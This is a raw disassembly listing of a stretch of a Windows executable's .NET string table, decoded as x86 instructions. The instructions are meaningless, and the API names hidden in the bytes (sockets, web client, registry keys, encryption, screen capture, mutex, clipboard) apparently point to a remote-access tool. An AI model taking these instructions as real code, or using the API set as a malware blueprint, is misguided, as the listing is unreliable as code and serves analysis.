  4064a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4064aa:	74 55                	je     0x406501
  4064ac:	73 65                	jae    0x406513
  4064ae:	72 00                	jb     0x4064b0
  4064b0:	45                   	inc    %ebp
  4064b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4064b2:	74 65                	je     0x406519
  4064b4:	72 00                	jb     0x4064b6
  4064b6:	42                   	inc    %edx
  4064b7:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4064be:	72 
  4064bf:	74 65                	je     0x406526
  4064c1:	72 00                	jb     0x4064c3
  4064c3:	53                   	push   %ebx
  4064c4:	65 72 76             	gs jb  0x40653d
  4064c7:	65 72 43             	gs jb  0x40650d
  4064ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4064cb:	6d                   	insl   (%dx),%es:(%edi)
  4064cc:	70 75                	jo     0x406543
  4064ce:	74 65                	je     0x406535
  4064d0:	72 00                	jb     0x4064d2
  4064d2:	4d                   	dec    %ebp
  4064d3:	79 43                	jns    0x406518
  4064d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d6:	6d                   	insl   (%dx),%es:(%edi)
  4064d7:	70 75                	jo     0x40654e
  4064d9:	74 65                	je     0x406540
  4064db:	72 00                	jb     0x4064dd
  4064dd:	54                   	push   %esp
  4064de:	6f                   	outsl  %ds:(%esi),(%dx)
  4064df:	4c                   	dec    %esp
  4064e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4064e1:	77 65                	ja     0x406548
  4064e3:	72 00                	jb     0x4064e5
  4064e5:	43                   	inc    %ebx
  4064e6:	6c                   	insb   (%dx),%es:(%edi)
  4064e7:	65 61                	gs popa
  4064e9:	72 50                	jb     0x40653b
  4064eb:	72 6f                	jb     0x40655c
  4064ed:	6a 65                	push   $0x65
  4064ef:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  4064f3:	72 6f                	jb     0x406564
  4064f5:	72 00                	jb     0x4064f7
  4064f7:	53                   	push   %ebx
  4064f8:	65 74 50             	gs je  0x40654b
  4064fb:	72 6f                	jb     0x40656c
  4064fd:	6a 65                	push   $0x65
  4064ff:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  406503:	72 6f                	jb     0x406574
  406505:	72 00                	jb     0x406507
  406507:	4d                   	dec    %ebp
  406508:	61                   	popa
  406509:	6e                   	outsb  %ds:(%esi),(%dx)
  40650a:	61                   	popa
  40650b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40650e:	65 6e                	outsb  %gs:(%esi),(%dx)
  406510:	74 4f                	je     0x406561
  406512:	62 6a 65             	bound  %ebp,0x65(%edx)
  406515:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  406519:	75 6d                	jne    0x406588
  40651b:	65 72 61             	gs jb  0x40657f
  40651e:	74 6f                	je     0x40658f
  406520:	72 00                	jb     0x406522
  406522:	47                   	inc    %edi
  406523:	65 74 45             	gs je  0x40656b
  406526:	6e                   	outsb  %ds:(%esi),(%dx)
  406527:	75 6d                	jne    0x406596
  406529:	65 72 61             	gs jb  0x40658d
  40652c:	74 6f                	je     0x40659d
  40652e:	72 00                	jb     0x406530
  406530:	41                   	inc    %ecx
  406531:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406535:	61                   	popa
  406536:	74 6f                	je     0x4065a7
  406538:	72 00                	jb     0x40653a
  40653a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40653f:	00 2e                	add    %ch,(%esi)
  406541:	63 63 74             	arpl   %esp,0x74(%ebx)
  406544:	6f                   	outsl  %ds:(%esi),(%dx)
  406545:	72 00                	jb     0x406547
  406547:	4d                   	dec    %ebp
  406548:	6f                   	outsl  %ds:(%esi),(%dx)
  406549:	6e                   	outsb  %ds:(%esi),(%dx)
  40654a:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  406551:	65 
  406552:	61                   	popa
  406553:	74 65                	je     0x4065ba
  406555:	44                   	inc    %esp
  406556:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40655a:	70 74                	jo     0x4065d0
  40655c:	6f                   	outsl  %ds:(%esi),(%dx)
  40655d:	72 00                	jb     0x40655f
  40655f:	43                   	inc    %ebx
  406560:	72 65                	jb     0x4065c7
  406562:	61                   	popa
  406563:	74 65                	je     0x4065ca
  406565:	45                   	inc    %ebp
  406566:	6e                   	outsb  %ds:(%esi),(%dx)
  406567:	63 72 79             	arpl   %esi,0x79(%edx)
  40656a:	70 74                	jo     0x4065e0
  40656c:	6f                   	outsl  %ds:(%esi),(%dx)
  40656d:	72 00                	jb     0x40656f
  40656f:	47                   	inc    %edi
  406570:	72 61                	jb     0x4065d3
  406572:	70 68                	jo     0x4065dc
  406574:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40657b:	74 65                	je     0x4065e2
  40657d:	6d                   	insl   (%dx),%es:(%edi)
  40657e:	2e 44                	cs inc %esp
  406580:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406587:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  40658e:	5f                   	pop    %edi
  40658f:	42                   	inc    %edx
  406590:	6f                   	outsl  %ds:(%esi),(%dx)
  406591:	75 6e                	jne    0x406601
  406593:	64 73 00             	fs jae 0x406596
  406596:	47                   	inc    %edi
  406597:	65 74 4d             	gs je  0x4065e7
  40659a:	65 74 68             	gs je  0x406605
  40659d:	6f                   	outsl  %ds:(%esi),(%dx)
  40659e:	64 73 00             	fs jae 0x4065a1
  4065a1:	4d                   	dec    %ebp
  4065a2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4065a9:	74 2e                	je     0x4065d9
  4065ab:	56                   	push   %esi
  4065ac:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4065b3:	73 69                	jae    0x40661e
  4065b5:	63 2e                	arpl   %ebp,(%esi)
  4065b7:	44                   	inc    %esp
  4065b8:	65 76 69             	gs jbe 0x406624
  4065bb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4065be:	00 4d 79             	add    %cl,0x79(%ebp)
  4065c1:	57                   	push   %edi
  4065c2:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  4065c6:	72 76                	jb     0x40663e
  4065c8:	69 63 65 73 00 4d 69 	imul   $0x694d0073,0x65(%ebx),%esp
  4065cf:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4065d2:	73 6f                	jae    0x406643
  4065d4:	66 74 2e             	data16 je 0x406605
  4065d7:	56                   	push   %esi
  4065d8:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4065df:	73 69                	jae    0x40664a
  4065e1:	63 2e                	arpl   %ebp,(%esi)
  4065e3:	41                   	inc    %ecx
  4065e4:	70 70                	jo     0x406656
  4065e6:	6c                   	insb   (%dx),%es:(%edi)
  4065e7:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4065ee:	53                   	push   %ebx
  4065ef:	65 72 76             	gs jb  0x406668
  4065f2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4065f9:	73 74                	jae    0x40666f
  4065fb:	65 6d                	gs insl (%dx),%es:(%edi)
  4065fd:	2e 52                	cs push %edx
  4065ff:	75 6e                	jne    0x40666f
  406601:	74 69                	je     0x40666c
  406603:	6d                   	insl   (%dx),%es:(%edi)
  406604:	65 2e 49             	gs cs dec %ecx
  406607:	6e                   	outsb  %ds:(%esi),(%dx)
  406608:	74 65                	je     0x40666f
  40660a:	72 6f                	jb     0x40667b
  40660c:	70 53                	jo     0x406661
  40660e:	65 72 76             	gs jb  0x406687
  406611:	69 63 65 73 00 4d 69 	imul   $0x694d0073,0x65(%ebx),%esp
  406618:	63 72 6f             	arpl   %esi,0x6f(%edx)
  40661b:	73 6f                	jae    0x40668c
  40661d:	66 74 2e             	data16 je 0x40664e
  406620:	56                   	push   %esi
  406621:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406628:	73 69                	jae    0x406693
  40662a:	63 2e                	arpl   %ebp,(%esi)
  40662c:	43                   	inc    %ebx
  40662d:	6f                   	outsl  %ds:(%esi),(%dx)
  40662e:	6d                   	insl   (%dx),%es:(%edi)
  40662f:	70 69                	jo     0x40669a
  406631:	6c                   	insb   (%dx),%es:(%edi)
  406632:	65 72 53             	gs jb  0x406688
  406635:	65 72 76             	gs jb  0x4066ae
  406638:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40663f:	73 74                	jae    0x4066b5
  406641:	65 6d                	gs insl (%dx),%es:(%edi)
  406643:	2e 52                	cs push %edx
  406645:	75 6e                	jne    0x4066b5
  406647:	74 69                	je     0x4066b2
  406649:	6d                   	insl   (%dx),%es:(%edi)
  40664a:	65 2e 43             	gs cs inc %ebx
  40664d:	6f                   	outsl  %ds:(%esi),(%dx)
  40664e:	6d                   	insl   (%dx),%es:(%edi)
  40664f:	70 69                	jo     0x4066ba
  406651:	6c                   	insb   (%dx),%es:(%edi)
  406652:	65 72 53             	gs jb  0x4066a8
  406655:	65 72 76             	gs jb  0x4066ce
  406658:	69 63 65 73 00 4d 69 	imul   $0x694d0073,0x65(%ebx),%esp
  40665f:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406662:	73 6f                	jae    0x4066d3
  406664:	66 74 2e             	data16 je 0x406695
  406667:	56                   	push   %esi
  406668:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  40666f:	73 69                	jae    0x4066da
  406671:	63 2e                	arpl   %ebp,(%esi)
  406673:	4d                   	dec    %ebp
  406674:	79 53                	jns    0x4066c9
  406676:	65 72 76             	gs jb  0x4066ef
  406679:	69 63 65 73 00 47 65 	imul   $0x65470073,0x65(%ebx),%esp
  406680:	74 49                	je     0x4066cb
  406682:	6e                   	outsb  %ds:(%esi),(%dx)
  406683:	73 74                	jae    0x4066f9
  406685:	61                   	popa
  406686:	6e                   	outsb  %ds:(%esi),(%dx)
  406687:	63 65 73             	arpl   %esp,0x73(%ebp)
  40668a:	00 47 65             	add    %al,0x65(%edi)
  40668d:	74 44                	je     0x4066d3
  40668f:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  406696:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%ebp),%esp
  40669d:	54                   	push   %esp
  40669e:	79 70                	jns    0x406710
  4066a0:	65 73 00             	gs jae 0x4066a3
  4066a3:	47                   	inc    %edi
  4066a4:	65 74 42             	gs je  0x4066e9
  4066a7:	79 74                	jns    0x40671d
  4066a9:	65 73 00             	gs jae 0x4066ac
  4066ac:	53                   	push   %ebx
  4066ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ae:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4066b1:	74 46                	je     0x4066f9
  4066b3:	6c                   	insb   (%dx),%es:(%edi)
  4066b4:	61                   	popa
  4066b5:	67 73 00             	addr16 jae 0x4066b8
  4066b8:	53                   	push   %ebx
  4066b9:	74 72                	je     0x40672d
  4066bb:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4066c2:	73 73                	jae    0x406737
  4066c4:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4066cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4066cc:	67 45                	addr16 inc %ebp
  4066ce:	76 65                	jbe    0x406735
  4066d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4066d1:	74 41                	je     0x406714
  4066d3:	72 67                	jb     0x40673c
  4066d5:	73 00                	jae    0x4066d7
  4066d7:	49                   	dec    %ecx
  4066d8:	43                   	inc    %ebx
  4066d9:	72 65                	jb     0x406740
  4066db:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4066de:	74 69                	je     0x406749
  4066e0:	61                   	popa
  4066e1:	6c                   	insb   (%dx),%es:(%edi)
  4066e2:	73 00                	jae    0x4066e4
  4066e4:	73 65                	jae    0x40674b
  4066e6:	74 5f                	je     0x406747
  4066e8:	43                   	inc    %ebx
  4066e9:	72 65                	jb     0x406750
  4066eb:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4066ee:	74 69                	je     0x406759
  4066f0:	61                   	popa
  4066f1:	6c                   	insb   (%dx),%es:(%edi)
  4066f2:	73 00                	jae    0x4066f4
  4066f4:	45                   	inc    %ebp
  4066f5:	71 75                	jno    0x40676c
  4066f7:	61                   	popa
  4066f8:	6c                   	insb   (%dx),%es:(%edi)
  4066f9:	73 00                	jae    0x4066fb
  4066fb:	53                   	push   %ebx
  4066fc:	79 73                	jns    0x406771
  4066fe:	74 65                	je     0x406765
  406700:	6d                   	insl   (%dx),%es:(%edi)
  406701:	2e 57                	cs push %edi
  406703:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40670a:	46                   	inc    %esi
  40670b:	6f                   	outsl  %ds:(%esi),(%dx)
  40670c:	72 6d                	jb     0x40677b
  40670e:	73 00                	jae    0x406710
  406710:	43                   	inc    %ebx
  406711:	6f                   	outsl  %ds:(%esi),(%dx)
  406712:	6e                   	outsb  %ds:(%esi),(%dx)
  406713:	74 61                	je     0x406776
  406715:	69 6e 73 00 43 6f 6e 	imul   $0x6e6f4300,0x73(%esi),%ebp
  40671c:	76 65                	jbe    0x406783
  40671e:	72 73                	jb     0x406793
  406720:	69 6f 6e 73 00 53 65 	imul   $0x65530073,0x6e(%edi),%ebp
  406727:	73 73                	jae    0x40679c
  406729:	69 6f 6e 45 6e 64 52 	imul   $0x52646e45,0x6e(%edi),%ebp
  406730:	65 61                	gs popa
  406732:	73 6f                	jae    0x4067a3
  406734:	6e                   	outsb  %ds:(%esi),(%dx)
  406735:	73 00                	jae    0x406737
  406737:	52                   	push   %edx
  406738:	75 6e                	jne    0x4067a8
  40673a:	74 69                	je     0x4067a5
  40673c:	6d                   	insl   (%dx),%es:(%edi)
  40673d:	65 48                	gs dec %eax
  40673f:	65 6c                	gs insb (%dx),%es:(%edi)
  406741:	70 65                	jo     0x4067a8
  406743:	72 73                	jb     0x4067b8
  406745:	00 4f 70             	add    %cl,0x70(%edi)
  406748:	65 72 61             	gs jb  0x4067ac
  40674b:	74 6f                	je     0x4067bc
  40674d:	72 73                	jb     0x4067c2
  40674f:	00 4d 61             	add    %cl,0x61(%ebp)
  406752:	6e                   	outsb  %ds:(%esi),(%dx)
  406753:	61                   	popa
  406754:	67 65 6d             	gs insl (%dx),%es:(%di)
  406757:	65 6e                	outsb  %gs:(%esi),(%dx)
  406759:	74 43                	je     0x40679e
  40675b:	6c                   	insb   (%dx),%es:(%edi)
  40675c:	61                   	popa
  40675d:	73 73                	jae    0x4067d2
  40675f:	00 46 69             	add    %al,0x69(%esi)
  406762:	6c                   	insb   (%dx),%es:(%edi)
  406763:	65 41                	gs inc %ecx
  406765:	63 63 65             	arpl   %esp,0x65(%ebx)
  406768:	73 73                	jae    0x4067dd
  40676a:	00 50 72             	add    %dl,0x72(%eax)
  40676d:	6f                   	outsl  %ds:(%esi),(%dx)
  40676e:	63 65 73             	arpl   %esp,0x73(%ebp)
  406771:	73 00                	jae    0x406773
  406773:	53                   	push   %ebx
  406774:	79 73                	jns    0x4067e9
  406776:	74 65                	je     0x4067dd
  406778:	6d                   	insl   (%dx),%es:(%edi)
  406779:	2e 4e                	cs dec %esi
  40677b:	65 74 2e             	gs je  0x4067ac
  40677e:	53                   	push   %ebx
  40677f:	6f                   	outsl  %ds:(%esi),(%dx)
  406780:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406783:	74 73                	je     0x4067f8
  406785:	00 53 79             	add    %dl,0x79(%ebx)
  406788:	73 74                	jae    0x4067fe
  40678a:	65 6d                	gs insl (%dx),%es:(%edi)
  40678c:	45                   	inc    %ebp
  40678d:	76 65                	jbe    0x4067f4
  40678f:	6e                   	outsb  %ds:(%esi),(%dx)
  406790:	74 73                	je     0x406805
  406792:	00 45 78             	add    %al,0x78(%ebp)
  406795:	69 73 74 73 00 43 6f 	imul   $0x6f430073,0x74(%ebx),%esi
  40679c:	6e                   	outsb  %ds:(%esi),(%dx)
  40679d:	63 61 74             	arpl   %esp,0x74(%ecx)
  4067a0:	00 49 6d             	add    %cl,0x6d(%ecx)
  4067a3:	61                   	popa
  4067a4:	67 65 46             	addr16 gs inc %esi
  4067a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4067a8:	72 6d                	jb     0x406817
  4067aa:	61                   	popa
  4067ab:	74 00                	je     0x4067ad
  4067ad:	50                   	push   %eax
  4067ae:	69 78 65 6c 46 6f 72 	imul   $0x726f466c,0x65(%eax),%edi
  4067b5:	6d                   	insl   (%dx),%es:(%edi)
  4067b6:	61                   	popa
  4067b7:	74 00                	je     0x4067b9
  4067b9:	41                   	inc    %ecx
  4067ba:	64 64 4f             	fs fs dec %edi
  4067bd:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067c0:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4067c4:	61                   	popa
  4067c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4067c6:	61                   	popa
  4067c7:	67 65 6d             	gs insl (%dx),%es:(%di)
  4067ca:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067cc:	74 42                	je     0x406810
  4067ce:	61                   	popa
  4067cf:	73 65                	jae    0x406836
  4067d1:	4f                   	dec    %edi
  4067d2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067d5:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  4067d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4067da:	6e                   	outsb  %ds:(%esi),(%dx)
  4067db:	63 61 74             	arpl   %esp,0x74(%ecx)
  4067de:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067e0:	61                   	popa
  4067e1:	74 65                	je     0x406848
  4067e3:	4f                   	dec    %edi
  4067e4:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067e7:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4067eb:	61                   	popa
  4067ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ed:	61                   	popa
  4067ee:	67 65 6d             	gs insl (%dx),%es:(%di)
  4067f1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067f3:	74 4f                	je     0x406844
  4067f5:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067f8:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4067fc:	79 50                	jns    0x40684e
  4067fe:	72 6f                	jb     0x40686f
  406800:	6a 65                	push   $0x65
  406802:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406806:	6f                   	outsl  %ds:(%esi),(%dx)
  406807:	6e                   	outsb  %ds:(%esi),(%dx)
  406808:	6e                   	outsb  %ds:(%esi),(%dx)
  406809:	65 63 74 00 4c       	arpl   %esi,%gs:0x4c(%eax,%eax,1)
  40680e:	61                   	popa
  40680f:	74 65                	je     0x406876
  406811:	47                   	inc    %edi
  406812:	65 74 00             	gs je  0x406815
  406815:	4c                   	dec    %esp
  406816:	61                   	popa
  406817:	74 65                	je     0x40687e
  406819:	49                   	dec    %ecx
  40681a:	6e                   	outsb  %ds:(%esi),(%dx)
  40681b:	64 65 78 47          	fs gs js 0x406866
  40681f:	65 74 00             	gs je  0x406822
  406822:	53                   	push   %ebx
  406823:	79 73                	jns    0x406898
  406825:	74 65                	je     0x40688c
  406827:	6d                   	insl   (%dx),%es:(%edi)
  406828:	2e 4e                	cs dec %esi
  40682a:	65 74 00             	gs je  0x40682d
  40682d:	53                   	push   %ebx
  40682e:	6f                   	outsl  %ds:(%esi),(%dx)
  40682f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406832:	74 00                	je     0x406834
  406834:	53                   	push   %ebx
  406835:	79 73                	jns    0x4068aa
  406837:	74 65                	je     0x40689e
  406839:	6d                   	insl   (%dx),%es:(%edi)
  40683a:	49                   	dec    %ecx
  40683b:	64 6c                	fs insb (%dx),%es:(%edi)
  40683d:	65 54                	gs push %esp
  40683f:	69 6d 65 72 52 65 73 	imul   $0x73655272,0x65(%ebp),%ebp
  406846:	65 74 00             	gs je  0x406849
  406849:	67 65 74 5f          	addr16 gs je 0x4068ac
  40684d:	48                   	dec    %eax
  40684e:	65 69 67 68 74 00 53 	imul   $0x70530074,%gs:0x68(%edi),%esp
  406855:	70 
  406856:	6c                   	insb   (%dx),%es:(%edi)
  406857:	69 74 00 47 72 61 70 	imul   $0x68706172,0x47(%eax,%eax,1),%esi
  40685e:	68 
  40685f:	69 63 73 55 6e 69 74 	imul   $0x74696e55,0x73(%ebx),%esp
  406866:	00 45 78             	add    %al,0x78(%ebp)
  406869:	69 74 00 67 65 74 5f 	imul   $0x445f7465,0x67(%eax,%eax,1),%esi
  406870:	44 
  406871:	65 66 61             	gs popaw
  406874:	75 6c                	jne    0x4068e2
  406876:	74 00                	je     0x406878
  406878:	67 65 74 5f          	addr16 gs je 0x4068db
  40687c:	43                   	inc    %ebx
  40687d:	6c                   	insb   (%dx),%es:(%edi)
  40687e:	69 65 6e 74 00 57 65 	imul   $0x65570074,0x6e(%ebp),%esp
  406885:	62 43 6c             	bound  %eax,0x6c(%ebx)
  406888:	69 65 6e 74 00 54 63 	imul   $0x63540074,0x6e(%ebp),%esp
  40688f:	70 43                	jo     0x4068d4
  406891:	6c                   	insb   (%dx),%es:(%edi)
  406892:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  406899:	73 74                	jae    0x40690f
  40689b:	65 6d                	gs insl (%dx),%es:(%edi)
  40689d:	2e 4d                	cs dec %ebp
  40689f:	61                   	popa
  4068a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4068a1:	61                   	popa
  4068a2:	67 65 6d             	gs insl (%dx),%es:(%di)
  4068a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068a7:	74 00                	je     0x4068a9
  4068a9:	52                   	push   %edx
  4068aa:	75 6e                	jne    0x40691a
  4068ac:	74 69                	je     0x406917
  4068ae:	6d                   	insl   (%dx),%es:(%edi)
  4068af:	65 45                	gs inc %ebp
  4068b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4068b2:	76 69                	jbe    0x40691d
  4068b4:	72 6f                	jb     0x406925
  4068b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4068b7:	6d                   	insl   (%dx),%es:(%edi)
  4068b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068ba:	74 00                	je     0x4068bc
  4068bc:	43                   	inc    %ebx
  4068bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4068be:	6d                   	insl   (%dx),%es:(%edi)
  4068bf:	70 6f                	jo     0x406930
  4068c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4068c2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068c4:	74 00                	je     0x4068c6
  4068c6:	67 65 74 5f          	addr16 gs je 0x406929
  4068ca:	43                   	inc    %ebx
  4068cb:	75 72                	jne    0x40693f
  4068cd:	72 65                	jb     0x406934
  4068cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4068d0:	74 00                	je     0x4068d2
  4068d2:	47                   	inc    %edi
  4068d3:	65 74 43             	gs je  0x406919
  4068d6:	75 72                	jne    0x40694a
  4068d8:	72 65                	jb     0x40693f
  4068da:	6e                   	outsb  %ds:(%esi),(%dx)
  4068db:	74 00                	je     0x4068dd
  4068dd:	50                   	push   %eax
  4068de:	61                   	popa
  4068df:	72 61                	jb     0x406942
  4068e1:	6d                   	insl   (%dx),%es:(%edi)
  4068e2:	65 74 65             	gs je  0x40694a
  4068e5:	72 69                	jb     0x406950
  4068e7:	7a 65                	jp     0x40694e
  4068e9:	64 54                	fs push %esp
  4068eb:	68 72 65 61 64       	push   $0x64616572
  4068f0:	53                   	push   %ebx
  4068f1:	74 61                	je     0x406954
  4068f3:	72 74                	jb     0x406969
  4068f5:	00 43 6f             	add    %al,0x6f(%ebx)
  4068f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4068f9:	76 65                	jbe    0x406960
  4068fb:	72 74                	jb     0x406971
  4068fd:	00 73 65             	add    %dh,0x65(%ebx)
  406900:	74 5f                	je     0x406961
  406902:	53                   	push   %ebx
  406903:	65 6e                	outsb  %gs:(%esi),(%dx)
  406905:	64 54                	fs push %esp
  406907:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40690e:	73 65                	jae    0x406975
  406910:	74 5f                	je     0x406971
  406912:	52                   	push   %edx
  406913:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  406917:	76 65                	jbe    0x40697e
  406919:	54                   	push   %esp
  40691a:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  406921:	4d                   	dec    %ebp
  406922:	6f                   	outsl  %ds:(%esi),(%dx)
  406923:	76 65                	jbe    0x40698a
  406925:	4e                   	dec    %esi
  406926:	65 78 74             	gs js  0x40699d
  406929:	00 53 79             	add    %dl,0x79(%ebx)
  40692c:	73 74                	jae    0x4069a2
  40692e:	65 6d                	gs insl (%dx),%es:(%edi)
  406930:	2e 54                	cs push %esp
  406932:	65 78 74             	gs js  0x4069a9
  406935:	00 47 65             	add    %al,0x65(%edi)
  406938:	74 54                	je     0x40698e
  40693a:	65 78 74             	gs js  0x4069b1
  40693d:	00 53 65             	add    %dl,0x65(%ebx)
  406940:	74 54                	je     0x406996
  406942:	65 78 74             	gs js  0x4069b9
  406945:	00 4d 75             	add    %cl,0x75(%ebp)
  406948:	74 65                	je     0x4069af
  40694a:	78 00                	js     0x40694c
  40694c:	43                   	inc    %ebx
  40694d:	6c                   	insb   (%dx),%es:(%edi)
  40694e:	69 65 6e 74 2e 4d 79 	imul   $0x794d2e74,0x6e(%ebp),%esp
  406955:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
  406959:	72 72                	jb     0x4069cd
  40695b:	61                   	popa
  40695c:	79 00                	jns    0x40695e
  40695e:	73 65                	jae    0x4069c5
  406960:	74 5f                	je     0x4069c1
  406962:	4b                   	dec    %ebx
  406963:	65 79 00             	gs jns 0x406966
  406966:	43                   	inc    %ebx
  406967:	72 65                	jb     0x4069ce
  406969:	61                   	popa
  40696a:	74 65                	je     0x4069d1
  40696c:	53                   	push   %ebx
  40696d:	75 62                	jne    0x4069d1
  40696f:	4b                   	dec    %ebx
  406970:	65 79 00             	gs jns 0x406973
  406973:	52                   	push   %edx
  406974:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40697b:	4b 65 
  40697d:	79 00                	jns    0x40697f
  40697f:	53                   	push   %ebx
  406980:	79 73                	jns    0x4069f5
  406982:	74 65                	je     0x4069e9
  406984:	6d                   	insl   (%dx),%es:(%edi)
  406985:	2e 53                	cs push %ebx
  406987:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40698b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406992:	70 
  406993:	74 6f                	je     0x406a04
  406995:	67 72 61             	addr16 jb 0x4069f9
  406998:	70 68                	jo     0x406a02
  40699a:	79 00                	jns    0x40699c
  40699c:	41                   	inc    %ecx
  40699d:	73 73                	jae    0x406a12
  40699f:	65 6d                	gs insl (%dx),%es:(%edi)
  4069a1:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4069a5:	43                   	inc    %ebx
  4069a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4069a7:	70 79                	jo     0x406a22
  4069a9:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4069ad:	64 4c                	fs dec %esp
  4069af:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  4069b6:	47                   	inc    %edi
  4069b7:	65 74 52             	gs je  0x406a0c
  4069ba:	75 6e                	jne    0x406a2a
  4069bc:	74 69                	je     0x406a27
  4069be:	6d                   	insl   (%dx),%es:(%edi)
  4069bf:	65 44                	gs inc %esp
  4069c1:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4069c8:	79 00                	jns    0x4069ca
  4069ca:	43                   	inc    %ebx
  4069cb:	72 65                	jb     0x406a32
  4069cd:	61                   	popa
  4069ce:	74 65                	je     0x406a35
  4069d0:	44                   	inc    %esp
  4069d1:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4069d8:	79 00                	jns    0x4069da
  4069da:	52                   	push   %edx
  4069db:	65 67 69 73 74 72 79 	imul   $0x57007972,%gs:0x74(%bp,%di),%esi
  4069e2:	00 57 
  4069e4:	69 6e 64 6f 77 73 49 	imul   $0x4973776f,0x64(%esi),%ebp
  4069eb:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4069ee:	74 69                	je     0x406a59
  4069f0:	74 79                	je     0x406a6b
  4069f2:	00 45 6d             	add    %al,0x6d(%ebp)
  4069f5:	70 74                	jo     0x406a6b
  4069f7:	79 00                	jns    0x4069f9
  4069f9:	43                   	inc    %ebx
  4069fa:	6c                   	insb   (%dx),%es:(%edi)
  4069fb:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  406a02:	50                   	push   %eax
  406a03:	72 6f                	jb     0x406a74
  406a05:	78 79                	js     0x406a80
  406a07:	00 e5                	add    %ah,%ch
  406a09:	b8 ad e6 b3 95       	mov    $0x95b3e6ad,%eax
  406a0e:	e7 9a                	out    %eax,$0x9a
  406a10:	84 e5                	test   %ah,%ch
